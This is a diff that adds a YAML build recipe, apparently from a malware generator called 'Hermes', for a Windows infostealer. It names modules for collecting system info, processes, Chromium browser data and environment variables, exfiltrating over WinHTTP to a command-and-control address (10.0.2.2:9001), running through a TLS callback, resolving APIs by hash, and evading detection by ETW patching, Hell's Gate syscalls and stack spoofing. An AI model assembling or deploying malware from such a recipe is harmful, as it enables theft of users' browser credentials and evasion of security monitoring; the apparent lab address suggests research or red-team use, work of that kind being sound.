@@ -1,0 +1,22 @@
+name: infostealer_cs_tls_winhttp_v1
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes_api
+- collectors/browser_chromium
+- collectors/env_vars
+exfil: exfil/winhttp_api
+arch: arch/tls_callback
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+- evasion/etw_patch
+- evasion/hells_gate
+- evasion/stack_spoof
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
